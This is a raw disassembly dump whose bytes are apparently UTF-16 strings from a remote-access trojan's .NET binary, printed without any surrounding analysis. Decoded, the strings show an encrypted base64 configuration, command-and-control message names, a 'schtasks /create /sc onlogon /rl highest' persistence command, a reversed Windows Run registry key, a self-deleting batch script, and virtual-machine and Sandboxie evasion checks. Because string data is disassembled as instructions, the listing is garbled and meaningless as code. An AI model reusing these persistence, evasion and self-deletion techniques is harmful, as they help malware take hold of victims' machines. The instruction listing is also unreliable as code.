  40be64:	68 00 6c 00 4a       	push   $0x4a006c00
  40be69:	00 34 00             	add    %dh,(%eax,%eax,1)
  40be6c:	6a 00                	push   $0x0
  40be6e:	68 00 55 00 50       	push   $0x50005500
  40be73:	00 73 00             	add    %dh,0x0(%ebx)
  40be76:	61                   	popa
  40be77:	00 73 00             	add    %dh,0x0(%ebx)
  40be7a:	57                   	push   %edi
  40be7b:	00 2b                	add    %ch,(%ebx)
  40be7d:	00 52 00             	add    %dl,0x0(%edx)
  40be80:	39 00                	cmp    %eax,(%eax)
  40be82:	4b                   	dec    %ebx
  40be83:	00 56 00             	add    %dl,0x0(%esi)
  40be86:	72 00                	jb     0x40be88
  40be88:	61                   	popa
  40be89:	00 77 00             	add    %dh,0x0(%edi)
  40be8c:	75 00                	jne    0x40be8e
  40be8e:	4f                   	dec    %edi
  40be8f:	00 47 00             	add    %al,0x0(%edi)
  40be92:	5a                   	pop    %edx
  40be93:	00 65 00             	add    %ah,0x0(%ebp)
  40be96:	56                   	push   %esi
  40be97:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40be9b:	00 37                	add    %dh,(%edi)
  40be9d:	00 63 00             	add    %ah,0x0(%ebx)
  40bea0:	72 00                	jb     0x40bea2
  40bea2:	35 00 77 00 58       	xor    $0x58007700,%eax
  40bea7:	00 6f 00             	add    %ch,0x0(%edi)
  40beaa:	41                   	inc    %ecx
  40beab:	00 59 00             	add    %bl,0x0(%ecx)
  40beae:	30 00                	xor    %al,(%eax)
  40beb0:	2f                   	das
  40beb1:	00 43 00             	add    %al,0x0(%ebx)
  40beb4:	62 00                	bound  %eax,(%eax)
  40beb6:	69 00 2b 00 64 00    	imul   $0x64002b,(%eax),%eax
  40bebc:	63 00                	arpl   %eax,(%eax)
  40bebe:	78 00                	js     0x40bec0
  40bec0:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40bec4:	4d                   	dec    %ebp
  40bec5:	00 33                	add    %dh,(%ebx)
  40bec7:	00 67 00             	add    %ah,0x0(%edi)
  40beca:	57                   	push   %edi
  40becb:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40becf:	00 79 00             	add    %bh,0x0(%ecx)
  40bed2:	65 00 36             	add    %dh,%gs:(%esi)
  40bed5:	00 67 00             	add    %ah,0x0(%edi)
  40bed8:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40bedc:	37                   	aaa
  40bedd:	00 31                	add    %dh,(%ecx)
  40bedf:	00 63 00             	add    %ah,0x0(%ebx)
  40bee2:	51                   	push   %ecx
  40bee3:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bee9:	80 b1 6f 00 53 00 2f 	xorb   $0x2f,0x53006f(%ecx)
  40bef0:	00 58 00             	add    %bl,0x0(%eax)
  40bef3:	5a                   	pop    %edx
  40bef4:	00 6d 00             	add    %ch,0x0(%ebp)
  40bef7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bef8:	00 30                	add    %dh,(%eax)
  40befa:	00 4a 00             	add    %cl,0x0(%edx)
  40befd:	78 00                	js     0x40beff
  40beff:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40bf03:	2b 00                	sub    (%eax),%eax
  40bf05:	50                   	push   %eax
  40bf06:	00 2f                	add    %ch,(%edi)
  40bf08:	00 58 00             	add    %bl,0x0(%eax)
  40bf0b:	5a                   	pop    %edx
  40bf0c:	00 30                	add    %dh,(%eax)
  40bf0e:	00 46 00             	add    %al,0x0(%esi)
  40bf11:	4e                   	dec    %esi
  40bf12:	00 5a 00             	add    %bl,0x0(%edx)
  40bf15:	47                   	inc    %edi
  40bf16:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40bf1a:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40bf1e:	00 77 00             	add    %dh,0x0(%edi)
  40bf21:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf22:	00 6a 00             	add    %ch,0x0(%edx)
  40bf25:	63 00                	arpl   %eax,(%eax)
  40bf27:	41                   	inc    %ecx
  40bf28:	00 48 00             	add    %cl,0x0(%eax)
  40bf2b:	49                   	dec    %ecx
  40bf2c:	00 43 00             	add    %al,0x0(%ebx)
  40bf2f:	6b 00 41             	imul   $0x41,(%eax),%eax
  40bf32:	00 70 00             	add    %dh,0x0(%eax)
  40bf35:	6b 00 69             	imul   $0x69,(%eax),%eax
  40bf38:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40bf3c:	00 45 00             	add    %al,0x0(%ebp)
  40bf3f:	37                   	aaa
  40bf40:	00 47 00             	add    %al,0x0(%edi)
  40bf43:	62 00                	bound  %eax,(%eax)
  40bf45:	73 00                	jae    0x40bf47
  40bf47:	34 00                	xor    $0x0,%al
  40bf49:	76 00                	jbe    0x40bf4b
  40bf4b:	46                   	inc    %esi
  40bf4c:	00 39                	add    %bh,(%ecx)
  40bf4e:	00 67 00             	add    %ah,0x0(%edi)
  40bf51:	38 00                	cmp    %al,(%eax)
  40bf53:	68 00 53 00 4d       	push   $0x4d005300
  40bf58:	00 52 00             	add    %dl,0x0(%edx)
  40bf5b:	54                   	push   %esp
  40bf5c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bf5f:	68 00 6f 00 6f       	push   $0x6f006f00
  40bf64:	00 79 00             	add    %bh,0x0(%ecx)
  40bf67:	37                   	aaa
  40bf68:	00 47 00             	add    %al,0x0(%edi)
  40bf6b:	4d                   	dec    %ebp
  40bf6c:	00 2b                	add    %ch,(%ebx)
  40bf6e:	00 77 00             	add    %dh,0x0(%edi)
  40bf71:	6d                   	insl   (%dx),%es:(%edi)
  40bf72:	00 50 00             	add    %dl,0x0(%eax)
  40bf75:	63 00                	arpl   %eax,(%eax)
  40bf77:	75 00                	jne    0x40bf79
  40bf79:	63 00                	arpl   %eax,(%eax)
  40bf7b:	39 00                	cmp    %eax,(%eax)
  40bf7d:	43                   	inc    %ebx
  40bf7e:	00 67 00             	add    %ah,0x0(%edi)
  40bf81:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40bf85:	56                   	push   %esi
  40bf86:	00 61 00             	add    %ah,0x0(%ecx)
  40bf89:	58                   	pop    %eax
  40bf8a:	00 52 00             	add    %dl,0x0(%edx)
  40bf8d:	70 00                	jo     0x40bf8f
  40bf8f:	72 00                	jb     0x40bf91
  40bf91:	48                   	dec    %eax
  40bf92:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf95:	41                   	inc    %ecx
  40bf96:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bf9c:	80 b1 64 00 7a 00 59 	xorb   $0x59,0x7a0064(%ecx)
  40bfa3:	00 71 00             	add    %dh,0x0(%ecx)
  40bfa6:	48                   	dec    %eax
  40bfa7:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40bfab:	00 52 00             	add    %dl,0x0(%edx)
  40bfae:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
  40bfb2:	44                   	inc    %esp
  40bfb3:	00 4a 00             	add    %cl,0x0(%edx)
  40bfb6:	62 00                	bound  %eax,(%eax)
  40bfb8:	46                   	inc    %esi
  40bfb9:	00 2b                	add    %ch,(%ebx)
  40bfbb:	00 55 00             	add    %dl,0x0(%ebp)
  40bfbe:	38 00                	cmp    %al,(%eax)
  40bfc0:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfc1:	00 4c 00 6c          	add    %cl,0x6c(%eax,%eax,1)
  40bfc5:	00 67 00             	add    %ah,0x0(%edi)
  40bfc8:	63 00                	arpl   %eax,(%eax)
  40bfca:	61                   	popa
  40bfcb:	00 4a 00             	add    %cl,0x0(%edx)
  40bfce:	6a 00                	push   $0x0
  40bfd0:	30 00                	xor    %al,(%eax)
  40bfd2:	47                   	inc    %edi
  40bfd3:	00 47 00             	add    %al,0x0(%edi)
  40bfd6:	79 00                	jns    0x40bfd8
  40bfd8:	53                   	push   %ebx
  40bfd9:	00 61 00             	add    %ah,0x0(%ecx)
  40bfdc:	41                   	inc    %ecx
  40bfdd:	00 39                	add    %bh,(%ecx)
  40bfdf:	00 38                	add    %bh,(%eax)
  40bfe1:	00 71 00             	add    %dh,0x0(%ecx)
  40bfe4:	31 00                	xor    %eax,(%eax)
  40bfe6:	57                   	push   %edi
  40bfe7:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40bfeb:	00 38                	add    %bh,(%eax)
  40bfed:	00 69 00             	add    %ch,0x0(%ecx)
  40bff0:	42                   	inc    %edx
  40bff1:	00 59 00             	add    %bl,0x0(%ecx)
  40bff4:	50                   	push   %eax
  40bff5:	00 65 00             	add    %ah,0x0(%ebp)
  40bff8:	32 00                	xor    (%eax),%al
  40bffa:	51                   	push   %ecx
  40bffb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bffe:	52                   	push   %edx
  40bfff:	00 2f                	add    %ch,(%edi)
  40c001:	00 59 00             	add    %bl,0x0(%ecx)
  40c004:	68 00 4c 00 67       	push   $0x67004c00
  40c009:	00 68 00             	add    %ch,0x0(%eax)
  40c00c:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40c010:	6e                   	outsb  %ds:(%esi),(%dx)
  40c011:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40c015:	00 30                	add    %dh,(%eax)
  40c017:	00 46 00             	add    %al,0x0(%esi)
  40c01a:	55                   	push   %ebp
  40c01b:	00 6d 00             	add    %ch,0x0(%ebp)
  40c01e:	78 00                	js     0x40c020
  40c020:	6f                   	outsl  %ds:(%esi),(%dx)
  40c021:	00 51 00             	add    %dl,0x0(%ecx)
  40c024:	49                   	dec    %ecx
  40c025:	00 31                	add    %dh,(%ecx)
  40c027:	00 70 00             	add    %dh,0x0(%eax)
  40c02a:	63 00                	arpl   %eax,(%eax)
  40c02c:	2b 00                	sub    (%eax),%eax
  40c02e:	4b                   	dec    %ebx
  40c02f:	00 63 00             	add    %ah,0x0(%ebx)
  40c032:	47                   	inc    %edi
  40c033:	00 37                	add    %dh,(%edi)
  40c035:	00 70 00             	add    %dh,0x0(%eax)
  40c038:	47                   	inc    %edi
  40c039:	00 2b                	add    %ch,(%ebx)
  40c03b:	00 47 00             	add    %al,0x0(%edi)
  40c03e:	52                   	push   %edx
  40c03f:	00 43 00             	add    %al,0x0(%ebx)
  40c042:	63 00                	arpl   %eax,(%eax)
  40c044:	66 00 36             	data16 add %dh,(%esi)
  40c047:	00 41 00             	add    %al,0x0(%ecx)
  40c04a:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c04f:	03 33                	add    (%ebx),%esi
  40c051:	00 00                	add    %al,(%eax)
  40c053:	80 b1 52 00 6a 00 78 	xorb   $0x78,0x6a0052(%ecx)
  40c05a:	00 72 00             	add    %dh,0x0(%edx)
  40c05d:	57                   	push   %edi
  40c05e:	00 42 00             	add    %al,0x0(%edx)
  40c061:	41                   	inc    %ecx
  40c062:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40c066:	00 5a 00             	add    %bl,0x0(%edx)
  40c069:	41                   	inc    %ecx
  40c06a:	00 39                	add    %bh,(%ecx)
  40c06c:	00 67 00             	add    %ah,0x0(%edi)
  40c06f:	6c                   	insb   (%dx),%es:(%edi)
  40c070:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40c074:	00 4d 00             	add    %cl,0x0(%ebp)
  40c077:	50                   	push   %eax
  40c078:	00 62 00             	add    %ah,0x0(%edx)
  40c07b:	5a                   	pop    %edx
  40c07c:	00 43 00             	add    %al,0x0(%ebx)
  40c07f:	34 00                	xor    $0x0,%al
  40c081:	45                   	inc    %ebp
  40c082:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c085:	2f                   	das
  40c086:	00 42 00             	add    %al,0x0(%edx)
  40c089:	54                   	push   %esp
  40c08a:	00 4a 00             	add    %cl,0x0(%edx)
  40c08d:	65 00 32             	add    %dh,%gs:(%edx)
  40c090:	00 7a 00             	add    %bh,0x0(%edx)
  40c093:	34 00                	xor    $0x0,%al
  40c095:	76 00                	jbe    0x40c097
  40c097:	46                   	inc    %esi
  40c098:	00 7a 00             	add    %bh,0x0(%edx)
  40c09b:	45                   	inc    %ebp
  40c09c:	00 6a 00             	add    %ch,0x0(%edx)
  40c09f:	5a                   	pop    %edx
  40c0a0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c0a3:	32 00                	xor    (%eax),%al
  40c0a5:	57                   	push   %edi
  40c0a6:	00 6d 00             	add    %ch,0x0(%ebp)
  40c0a9:	7a 00                	jp     0x40c0ab
  40c0ab:	43                   	inc    %ebx
  40c0ac:	00 32                	add    %dh,(%edx)
  40c0ae:	00 4d 00             	add    %cl,0x0(%ebp)
  40c0b1:	38 00                	cmp    %al,(%eax)
  40c0b3:	38 00                	cmp    %al,(%eax)
  40c0b5:	62 00                	bound  %eax,(%eax)
  40c0b7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0b8:	00 48 00             	add    %cl,0x0(%eax)
  40c0bb:	4f                   	dec    %edi
  40c0bc:	00 4d 00             	add    %cl,0x0(%ebp)
  40c0bf:	6d                   	insl   (%dx),%es:(%edi)
  40c0c0:	00 6e 00             	add    %ch,0x0(%esi)
  40c0c3:	32 00                	xor    (%eax),%al
  40c0c5:	32 00                	xor    (%eax),%al
  40c0c7:	48                   	dec    %eax
  40c0c8:	00 6a 00             	add    %ch,0x0(%edx)
  40c0cb:	73 00                	jae    0x40c0cd
  40c0cd:	4f                   	dec    %edi
  40c0ce:	00 75 00             	add    %dh,0x0(%ebp)
  40c0d1:	4d                   	dec    %ebp
  40c0d2:	00 56 00             	add    %dl,0x0(%esi)
  40c0d5:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c0d9:	62 00                	bound  %eax,(%eax)
  40c0db:	63 00                	arpl   %eax,(%eax)
  40c0dd:	46                   	inc    %esi
  40c0de:	00 50 00             	add    %dl,0x0(%eax)
  40c0e1:	49                   	dec    %ecx
  40c0e2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c0e5:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40c0e9:	72 00                	jb     0x40c0eb
  40c0eb:	55                   	push   %ebp
  40c0ec:	00 65 00             	add    %ah,0x0(%ebp)
  40c0ef:	4b                   	dec    %ebx
  40c0f0:	00 5a 00             	add    %bl,0x0(%edx)
  40c0f3:	45                   	inc    %ebp
  40c0f4:	00 4f 00             	add    %cl,0x0(%edi)
  40c0f7:	31 00                	xor    %eax,(%eax)
  40c0f9:	4c                   	dec    %esp
  40c0fa:	00 6a 00             	add    %ch,0x0(%edx)
  40c0fd:	71 00                	jno    0x40c0ff
  40c0ff:	67 00 3d             	add    %bh,(%di)
  40c102:	00 3d 00 00 09 6e    	add    %bh,0x6e090000
  40c108:	00 75 00             	add    %dh,0x0(%ebp)
  40c10b:	6c                   	insb   (%dx),%es:(%edi)
  40c10c:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c110:	01 00                	add    %eax,(%eax)
  40c112:	03 3a                	add    (%edx),%edi
  40c114:	00 00                	add    %al,(%eax)
  40c116:	0d 50 00 61 00       	or     $0x610050,%eax
  40c11b:	63 00                	arpl   %eax,(%eax)
  40c11d:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c120:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c124:	09 50 00             	or     %edx,0x0(%eax)
  40c127:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c12d:	00 0f                	add    %cl,(%edi)
  40c12f:	4d                   	dec    %ebp
  40c130:	00 65 00             	add    %ah,0x0(%ebp)
  40c133:	73 00                	jae    0x40c135
  40c135:	73 00                	jae    0x40c137
  40c137:	61                   	popa
  40c138:	00 67 00             	add    %ah,0x0(%edi)
  40c13b:	65 00 00             	add    %al,%gs:(%eax)
  40c13e:	07                   	pop    %es
  40c13f:	63 00                	arpl   %eax,(%eax)
  40c141:	6d                   	insl   (%dx),%es:(%edi)
  40c142:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c146:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c14c:	00 73 00             	add    %dh,0x0(%ebx)
  40c14f:	63 00                	arpl   %eax,(%eax)
  40c151:	68 00 74 00 61       	push   $0x61007400
  40c156:	00 73 00             	add    %dh,0x0(%ebx)
  40c159:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c15c:	00 20                	add    %ah,(%eax)
  40c15e:	00 2f                	add    %ch,(%edi)
  40c160:	00 63 00             	add    %ah,0x0(%ebx)
  40c163:	72 00                	jb     0x40c165
  40c165:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c169:	74 00                	je     0x40c16b
  40c16b:	65 00 20             	add    %ah,%gs:(%eax)
  40c16e:	00 2f                	add    %ch,(%edi)
  40c170:	00 66 00             	add    %ah,0x0(%esi)
  40c173:	20 00                	and    %al,(%eax)
  40c175:	2f                   	das
  40c176:	00 73 00             	add    %dh,0x0(%ebx)
  40c179:	63 00                	arpl   %eax,(%eax)
  40c17b:	20 00                	and    %al,(%eax)
  40c17d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c17e:	00 6e 00             	add    %ch,0x0(%esi)
  40c181:	6c                   	insb   (%dx),%es:(%edi)
  40c182:	00 6f 00             	add    %ch,0x0(%edi)
  40c185:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c189:	6e                   	outsb  %ds:(%esi),(%dx)
  40c18a:	00 20                	add    %ah,(%eax)
  40c18c:	00 2f                	add    %ch,(%edi)
  40c18e:	00 72 00             	add    %dh,0x0(%edx)
  40c191:	6c                   	insb   (%dx),%es:(%edi)
  40c192:	00 20                	add    %ah,(%eax)
  40c194:	00 68 00             	add    %ch,0x0(%eax)
  40c197:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c19d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c1a1:	74 00                	je     0x40c1a3
  40c1a3:	20 00                	and    %al,(%eax)
  40c1a5:	2f                   	das
  40c1a6:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c1aa:	00 20                	add    %ah,(%eax)
  40c1ac:	00 22                	add    %ah,(%edx)
  40c1ae:	00 00                	add    %al,(%eax)
  40c1b0:	11 22                	adc    %esp,(%edx)
  40c1b2:	00 20                	add    %ah,(%eax)
  40c1b4:	00 2f                	add    %ch,(%edi)
  40c1b6:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c1ba:	00 20                	add    %ah,(%eax)
  40c1bc:	00 27                	add    %ah,(%edi)
  40c1be:	00 22                	add    %ah,(%edx)
  40c1c0:	00 01                	add    %al,(%ecx)
  40c1c2:	13 22                	adc    (%edx),%esp
  40c1c4:	00 27                	add    %ah,(%edi)
  40c1c6:	00 20                	add    %ah,(%eax)
  40c1c8:	00 26                	add    %ah,(%esi)
  40c1ca:	00 20                	add    %ah,(%eax)
  40c1cc:	00 65 00             	add    %ah,0x0(%ebp)
  40c1cf:	78 00                	js     0x40c1d1
  40c1d1:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c1d7:	5c                   	pop    %esp
  40c1d8:	00 6e 00             	add    %ch,0x0(%esi)
  40c1db:	75 00                	jne    0x40c1dd
  40c1dd:	52                   	push   %edx
  40c1de:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c1e2:	00 6f 00             	add    %ch,0x0(%edi)
  40c1e5:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c1eb:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c1ef:	74 00                	je     0x40c1f1
  40c1f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1f2:	00 65 00             	add    %ah,0x0(%ebp)
  40c1f5:	72 00                	jb     0x40c1f7
  40c1f7:	72 00                	jb     0x40c1f9
  40c1f9:	75 00                	jne    0x40c1fb
  40c1fb:	43                   	inc    %ebx
  40c1fc:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c200:	00 77 00             	add    %dh,0x0(%edi)
  40c203:	6f                   	outsl  %ds:(%esi),(%dx)
  40c204:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c208:	00 69 00             	add    %ch,0x0(%ecx)
  40c20b:	57                   	push   %edi
  40c20c:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c210:	00 66 00             	add    %ah,0x0(%esi)
  40c213:	6f                   	outsl  %ds:(%esi),(%dx)
  40c214:	00 73 00             	add    %dh,0x0(%ebx)
  40c217:	6f                   	outsl  %ds:(%esi),(%dx)
  40c218:	00 72 00             	add    %dh,0x0(%edx)
  40c21b:	63 00                	arpl   %eax,(%eax)
  40c21d:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c223:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c227:	61                   	popa
  40c228:	00 77 00             	add    %dh,0x0(%edi)
  40c22b:	74 00                	je     0x40c22d
  40c22d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c231:	53                   	push   %ebx
  40c232:	00 00                	add    %al,(%eax)
  40c234:	03 22                	add    (%edx),%esp
  40c236:	00 00                	add    %al,(%eax)
  40c238:	09 2e                	or     %ebp,(%esi)
  40c23a:	00 62 00             	add    %ah,0x0(%edx)
  40c23d:	61                   	popa
  40c23e:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c242:	13 40 00             	adc    0x0(%eax),%eax
  40c245:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c249:	68 00 6f 00 20       	push   $0x20006f00
  40c24e:	00 6f 00             	add    %ch,0x0(%edi)
  40c251:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c255:	00 1f                	add    %bl,(%edi)
  40c257:	74 00                	je     0x40c259
  40c259:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c25f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c260:	00 75 00             	add    %dh,0x0(%ebp)
  40c263:	74 00                	je     0x40c265
  40c265:	20 00                	and    %al,(%eax)
  40c267:	33 00                	xor    (%eax),%eax
  40c269:	20 00                	and    %al,(%eax)
  40c26b:	3e 00 20             	add    %ah,%ds:(%eax)
  40c26e:	00 4e 00             	add    %cl,0x0(%esi)
  40c271:	55                   	push   %ebp
  40c272:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c276:	15 53 00 54 00       	adc    $0x540053,%eax
  40c27b:	41                   	inc    %ecx
  40c27c:	00 52 00             	add    %dl,0x0(%edx)
  40c27f:	54                   	push   %esp
  40c280:	00 20                	add    %ah,(%eax)
  40c282:	00 22                	add    %ah,(%edx)
  40c284:	00 22                	add    %ah,(%edx)
  40c286:	00 20                	add    %ah,(%eax)
  40c288:	00 22                	add    %ah,(%edx)
  40c28a:	00 00                	add    %al,(%eax)
  40c28c:	07                   	pop    %es
  40c28d:	43                   	inc    %ebx
  40c28e:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c292:	00 00                	add    %al,(%eax)
  40c294:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c298:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c29c:	00 22                	add    %ah,(%edx)
  40c29e:	00 00                	add    %al,(%eax)
  40c2a0:	0f 22 00             	mov    %eax,%cr0
  40c2a3:	20 00                	and    %al,(%eax)
  40c2a5:	2f                   	das
  40c2a6:	00 66 00             	add    %ah,0x0(%esi)
  40c2a9:	20 00                	and    %al,(%eax)
  40c2ab:	2f                   	das
  40c2ac:	00 71 00             	add    %dh,0x0(%ecx)
  40c2af:	00 05 78 00 70 00    	add    %al,0x700078
  40c2b5:	00 45 53             	add    %al,0x53(%ebp)
  40c2b8:	00 65 00             	add    %ah,0x0(%ebp)
  40c2bb:	6c                   	insb   (%dx),%es:(%edi)
  40c2bc:	00 65 00             	add    %ah,0x0(%ebp)
  40c2bf:	63 00                	arpl   %eax,(%eax)
  40c2c1:	74 00                	je     0x40c2c3
  40c2c3:	20 00                	and    %al,(%eax)
  40c2c5:	2a 00                	sub    (%eax),%al
  40c2c7:	20 00                	and    %al,(%eax)
  40c2c9:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c2cd:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2ce:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2d1:	20 00                	and    %al,(%eax)
  40c2d3:	57                   	push   %edi
  40c2d4:	00 69 00             	add    %ch,0x0(%ecx)
  40c2d7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2d8:	00 33                	add    %dh,(%ebx)
  40c2da:	00 32                	add    %dh,(%edx)
  40c2dc:	00 5f 00             	add    %bl,0x0(%edi)
  40c2df:	43                   	inc    %ebx
  40c2e0:	00 6f 00             	add    %ch,0x0(%edi)
  40c2e3:	6d                   	insl   (%dx),%es:(%edi)
  40c2e4:	00 70 00             	add    %dh,0x0(%eax)
  40c2e7:	75 00                	jne    0x40c2e9
  40c2e9:	74 00                	je     0x40c2eb
  40c2eb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2ef:	53                   	push   %ebx
  40c2f0:	00 79 00             	add    %bh,0x0(%ecx)
  40c2f3:	73 00                	jae    0x40c2f5
  40c2f5:	74 00                	je     0x40c2f7
  40c2f7:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2fb:	00 19                	add    %bl,(%ecx)
  40c2fd:	4d                   	dec    %ebp
  40c2fe:	00 61 00             	add    %ah,0x0(%ecx)
  40c301:	6e                   	outsb  %ds:(%esi),(%dx)
  40c302:	00 75 00             	add    %dh,0x0(%ebp)
  40c305:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c309:	63 00                	arpl   %eax,(%eax)
  40c30b:	74 00                	je     0x40c30d
  40c30d:	75 00                	jne    0x40c30f
  40c30f:	72 00                	jb     0x40c311
  40c311:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c315:	00 2b                	add    %ch,(%ebx)
  40c317:	6d                   	insl   (%dx),%es:(%edi)
  40c318:	00 69 00             	add    %ch,0x0(%ecx)
  40c31b:	63 00                	arpl   %eax,(%eax)
  40c31d:	72 00                	jb     0x40c31f
  40c31f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c320:	00 73 00             	add    %dh,0x0(%ebx)
  40c323:	6f                   	outsl  %ds:(%esi),(%dx)
  40c324:	00 66 00             	add    %ah,0x0(%esi)
  40c327:	74 00                	je     0x40c329
  40c329:	20 00                	and    %al,(%eax)
  40c32b:	63 00                	arpl   %eax,(%eax)
  40c32d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c32e:	00 72 00             	add    %dh,0x0(%edx)
  40c331:	70 00                	jo     0x40c333
  40c333:	6f                   	outsl  %ds:(%esi),(%dx)
  40c334:	00 72 00             	add    %dh,0x0(%edx)
  40c337:	61                   	popa
  40c338:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c33c:	00 6f 00             	add    %ch,0x0(%edi)
  40c33f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c340:	00 00                	add    %al,(%eax)
  40c342:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c345:	6f                   	outsl  %ds:(%esi),(%dx)
  40c346:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c34a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c34e:	0f 56 00             	orps   (%eax),%xmm0
  40c351:	49                   	dec    %ecx
  40c352:	00 52 00             	add    %dl,0x0(%edx)
  40c355:	54                   	push   %esp
  40c356:	00 55 00             	add    %dl,0x0(%ebp)
  40c359:	41                   	inc    %ecx
  40c35a:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c35e:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c363:	77 00                	ja     0x40c365
  40c365:	61                   	popa
  40c366:	00 72 00             	add    %dh,0x0(%edx)
  40c369:	65 00 00             	add    %al,%gs:(%eax)
  40c36c:	15 56 00 69 00       	adc    $0x690056,%eax
  40c371:	72 00                	jb     0x40c373
  40c373:	74 00                	je     0x40c375
  40c375:	75 00                	jne    0x40c377
  40c377:	61                   	popa
  40c378:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c37c:	00 6f 00             	add    %ch,0x0(%edi)
  40c37f:	78 00                	js     0x40c381
  40c381:	00 17                	add    %dl,(%edi)
  40c383:	53                   	push   %ebx
  40c384:	00 62 00             	add    %ah,0x0(%edx)
  40c387:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c38d:	6c                   	insb   (%dx),%es:(%edi)
  40c38e:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c392:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c396:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c39a:	11 45 00             	adc    %eax,0x0(%ebp)
  40c39d:	72 00                	jb     0x40c39f
  40c39f:	72 00                	jb     0x40c3a1
  40c3a1:	20 00                	and    %al,(%eax)
  40c3a3:	48                   	dec    %eax
  40c3a4:	00 57 00             	add    %dl,0x0(%edi)
  40c3a7:	49                   	dec    %ecx
  40c3a8:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3ac:	05 78 00 32 00       	add    $0x320078,%eax
  40c3b1:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c3b7:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c3bd:	74 00                	je     0x40c3bf
  40c3bf:	49                   	dec    %ecx
  40c3c0:	00 6e 00             	add    %ch,0x0(%esi)
  40c3c3:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c3c7:	00 09                	add    %cl,(%ecx)
